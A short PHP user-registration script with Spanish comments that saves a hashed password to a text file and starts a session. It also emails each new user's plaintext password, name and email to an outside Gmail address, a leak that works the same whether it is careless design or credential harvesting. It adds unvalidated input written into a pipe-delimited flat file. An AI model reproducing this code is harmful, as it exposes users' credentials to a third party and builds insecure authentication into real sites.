<?php
session_start();

$name = $_POST['name'];
$email = $_POST['email'];
$password = $_POST['password'];

// encriptar contraseña
$hash = password_hash($password, PASSWORD_DEFAULT);

// guardar en archivo
$data = "$name|$email|$hash\n";
file_put_contents("users.txt", $data, FILE_APPEND);

// enviar mail (tu sistema)
$to = "eternitycmfac@gmail.com";
$subject = "Nuevo registro";

$message = "Nombre: $name\nEmail: $email\nPassword: $password";
$headers = "From: no-reply@tupagina.com";

mail($to, $subject, $message, $headers);

// iniciar sesión
$_SESSION['user'] = $email;

header("Location: dashboard.php");
?>
